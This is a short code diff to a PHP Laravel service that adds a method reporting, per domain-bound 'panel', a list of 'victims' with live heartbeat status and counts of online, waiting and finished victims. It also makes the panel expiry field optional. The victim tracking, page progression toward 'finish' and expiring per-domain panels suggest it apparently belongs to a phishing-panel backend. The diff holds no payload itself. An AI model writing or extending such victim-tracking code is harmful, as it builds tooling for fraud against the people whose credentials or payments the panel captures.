@@ -44,9 +44,34 @@ class UserPanelService
     return $panel;
   }
 
+  public function getMetadataByDomain($domain)
+  {
+    $panel = $this->getByDomain($domain);
+
+    $data = [
+      ...$panel->toArray(),
+      'victims' => $panel->Victims()->orderBy('created_at', 'desc')->get()->map(function ($victim) {
+        return [
+          ...$victim->toArray(),
+          'is_waiting' => $victim->heartbeat >= intval(Carbon::now()->subMinute()->timestamp) && $victim->heartbeat <= intval(Carbon::now()->timestamp)
+        ];
+      }),
+      'meta' => [
+        'total_victims' => $panel->Victims()->count(),
+        'total_online' => $panel->Victims()->where('next_page', '!=', 'finish')->count(),
+        'total_finished' => $panel->Victims()->where('next_page', 'finish')->count(),
+        'total_waiting' => $panel->Victims()->whereBetween('heartbeat', [intval(Carbon::now()->subMinute()->timestamp), intval(Carbon::now()->timestamp)])->count()
+      ]
+    ];
+
+    return $data;
+  }
+
   public function update($id, $input)
   {
-    $input['expired_at'] = Carbon::parse($input['expired_at']);
+    if (array_key_exists('expired_at', $input)) {
+      $input['expired_at'] = Carbon::parse($input['expired_at']);
+    }
     $panel = UserPanel::find($id);
     if ($panel) {
       $panel->update($input);
